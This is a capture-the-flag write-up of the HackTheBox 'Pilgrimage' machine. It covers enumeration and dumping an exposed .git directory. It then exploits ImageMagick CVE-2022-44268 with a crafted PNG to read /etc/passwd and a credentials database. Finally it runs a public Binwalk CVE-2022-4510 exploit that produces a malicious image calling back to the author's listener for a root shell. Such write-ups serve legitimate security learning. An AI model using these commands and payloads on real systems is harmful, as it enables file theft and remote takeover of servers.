---
title: "HackTheBox - Pilgrimage"
author: Nasrallah
description: ""
date: 2023-08-01 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cronjob, cve, rce, git]
img_path: /assets/img/hackthebox/machines/pilgrimage
image:
    path: pilgrimage.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Pilgrimage](https://www.hackthebox.com/machines/pilgrimage) from [HackTheBox](https://www.hackthebox.com) uses a vulnerable program to shrink images, we exploit it to get a foothold. On the system we find cronjob running a script that also uses a vulnerable program, we again exploit it to get root.

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.219
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open port, 22 running OpenSSh and 80 running Nginx 1.18.0.

The http-title script from nmap reveals the hostname `pilgrimage.htb`, let's add that to `/etc/hosts`

### Web

Let's navigate to `http://pilgrimage.htb`

![](1.png)

The website allows us to upload image to shrink them.

#### feroxbuster

Let's run a directory/files scan

```shell
$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://pilgrimage.htb/ -n                                                [354/1267]
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ http://pilgrimage.htb/                                                                                                           
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt                                                                                
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 🏁  HTTP methods          │ [GET]                                                                                                                            
 🚫  Do Not Recurse        │ true                                                                                                                             
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
───────────────────────────┴──────────────────────                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                           
──────────────────────────────────────────────────                                                                                                            
200      GET      198l      494w        0c http://pilgrimage.htb/                                                                                             
301      GET        7l       11w      169c http://pilgrimage.htb/.git => http://pilgrimage.htb/.git/                                                          
403      GET        7l        9w      153c http://pilgrimage.htb/.htpasswd                                                                                    
403      GET        7l        9w      153c http://pilgrimage.htb/.htaccess                                                                                    
301      GET        7l       11w      169c http://pilgrimage.htb/assets => http://pilgrimage.htb/assets/                                                      
301      GET        7l       11w      169c http://pilgrimage.htb/tmp => http://pilgrimage.htb/tmp/                                                            
301      GET        7l       11w      169c http://pilgrimage.htb/vendor => http://pilgrimage.htb/vendor/                                                      
[####################] - 48s    20477/20477   0s      found:7       errors:0                                                                                  
[####################] - 48s    20477/20477   424/s   http://pilgrimage.htb/                       
```

We found a `.git` directory.

### Git

We can use `gitdumper` from [GitTools](https://github.com/internetwache/GitTools) to download the directory.

```bash
./GitTools/Dumper/gitdumper.sh http://pilgrimage.htb/.git/ git 
```

Now we use extractor to rebuild the files.

```bash
./GitTools/Extractor/extractor.sh git git
```

Now let's check what we just extracted

```shell
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/pilgrimage]
└──╼ $ cd git/0-e1a40beebc7035212efdcb15476f9c994e3634a7 
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/…/Machines/pilgrimage/git/0-e1a40beebc7035212efdcb15476f9c994e3634a7]
└──╼ $ ls
assets  commit-meta.txt  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

Those are the web files.

If we read the `index.php` file we can see the line responsible from shrinking the image.

```php
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/"
 . $newname . $mime)
```

The script is using a binary called `magick` to convert the image.

We can find the binary with the web files, let's check it.

```bash
./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

This is `imagemagick` version `7.1.0-49 beta`.

Searching for this on `Exploit-db` we find the following:

![](2.png)

The software is vulnerable to an `Arbitrary File Read`. The proof of concept can be found here [https://github.com/voidz0r/CVE-2022-44268](https://github.com/voidz0r/CVE-2022-44268).

I tried using the exploit but had a problem with `cargo` so i found this [POC](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC) that uses `pngcrush`.

```bash
$ pngcrush -text a "profile" "/etc/passwd" image.png
  Recompressing IDAT chunks in image.png to pngout.png
   Total length of data found in critical chunks            =     78556
   Best pngcrush method        =   7 (ws 15 fm 0 zl 9 zs 0) =     67736
CPU time decode 0.091934, encode 0.669882, other 0.005451, total 0.779431 sec
```

This generated the file `pngout.png`, let's upload it and get the shrunk version.

Let's download the shrunk version from the website and run the command `identify -verbose 64e********.png` or just use `exiftool` which i find better.

```bash
$ exiftool 64e5c5ea2b844.png                                                                                                                             
ExifTool Version Number         : 12.16                                                                                                                       
File Name                       : 64e5c5ea2b844.png                                                                                                           
Directory                       : .                                                                                                                           
File Size                       : 47 KiB                                                                                                                      
File Modification Date/Time     : 2023:08:23 09:40:10+01:00                                                                                                   
File Access Date/Time           : 2023:08:23 09:41:02+01:00                                                                                                   
File Inode Change Date/Time     : 2023:08:23 09:41:02+01:00                                                                                                   
File Permissions                : rw-r--r--                                                                                                                   
File Type                       : PNG                                                                                                                         
File Type Extension             : png                                                                                                                         
MIME Type                       : image/png     
[...]
Raw Profile Type                : ..    1437.726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d.6f6e3a783a313a313a6461656d6f6e3a2f757372
2f7362696e3a2f7573722f7362696e2f.6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e.2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465
763a2f7573722f736269.6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f.62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f757372
2f67616d.65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a.2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a.783
a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372.2f7362696e2f6e6
f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73.706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31.303a31303a757563703a2f76617
22f73706f6f6c2f757563703a2f7573722f7362696e2f.6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573.722f7362696e2f6e6f6c6f67696e0a7777772d6
46174613a783a33333a33333a7777772d.646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b.75703a783a33343a33343a6261636b75703a2f7661722f62616
36b7570733a2f7573722f.7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69.7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6
e6f6c6f67.696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73.62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d.52
65706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e.6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334.3a36353533343a
6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e.2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374.656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a73797374656d642d6e6574776f72.6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65.6e742c2c2c3a2f72756e2f73797374656d643a
2f7573722f7362696e2f6e6f6c6f67696e.0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052.65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f
7573722f7362696e2f6e6f.6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973.74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d
74696d6573.796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69.7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c.6
f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d.652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78.3a3939393a393
9393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f.7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f.737368643a2f7573722f73626
96e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938.3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a.
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2023-08-23T08:40:10+00:00
Datemodify                      : 2023-08-23T08:40:10+00:00
Datetimestamp                   : 2023-08-23T08:40:10+00:00
Image Size                      : 512x512
Megapixels                      : 0.262 
```

We got a long hex string, let's copy it to `CyberChef` to decode it.

![](3.png)

We got the `/etc/passwd` file and found the user `emily`.

Tried to get `emily`s private key but no luck with that.

Looking back at the `login.php` file, we see that that database used is `sqlite`, and the file is located at `var/db/pilgrimage`.

```php
$db = new PDO('sqlite:/var/db/pilgrimage');
```

Let's get that file using the same technique.

```bash
$ pngcrush -text a "profile" "/var/db/pilgrimage" image.png 
  Recompressing IDAT chunks in image.png to pngout.png
   Total length of data found in critical chunks            =     78556
   Best pngcrush method        =   7 (ws 15 fm 0 zl 9 zs 0) =     67736
CPU time decode 0.099510, encode 0.689412, other 0.005913, total 0.808242 sec
```

We upload the image and download the shrunk one.

Now we get the hex for the `sqlite` file.

```bash
exiftool 64e5c8072eae8.png | grep -i 'raw profile' > data.hex
```

The hex string is so big so we save it to a file then upload the file to `CyberChef`

![](4.png)

Now let's save the output to a file.

## **Foothold**

Using `sqlite3` we can investigate the database file.

```bash
$ sqlite3 pilgrimage.sqlite 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
images  users 
sqlite> select * from users;
emily|abigcxxxxxxxxxxxx
```

We found `emily`'s password, now let's ssh to the target.

```shell
$ ssh emily@pilgrimage.htb                 
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
```

# **Privilege Escalation**

By running `pspy64` we notice a cronjob running a bash script:

![](5.png)

Let's see what the script does.

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

The script is checking for the `/var/www/pilgrimage.htb/shrunk` for the created files and analyzes them using `binwalk`.

Checking the version of `binwalk` in the box we found it's `Binwalk v2.3.2`.

This version is vulnerable to [Code Execution](https://www.exploit-db.com/exploits/51249).

![](6.png)

Let's download the exploit and create the malicious file.

```shell
$ python binwalkexploit.py codium.png 10.10.17.90 9001                                                                                               2 ⨯

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.

                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/pilgrimage]
└──╼ $ ls    
binwalk_exploit.png
```

Let's setup a listener and upload the file.

![](7.png)

Right after we upload the file we get a root shell.

## **Prevention and mitigation**

### CVE

The machine uses two outdated and vulnerable programs `magick` and `binwalk`. They should be updated to a newer version.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).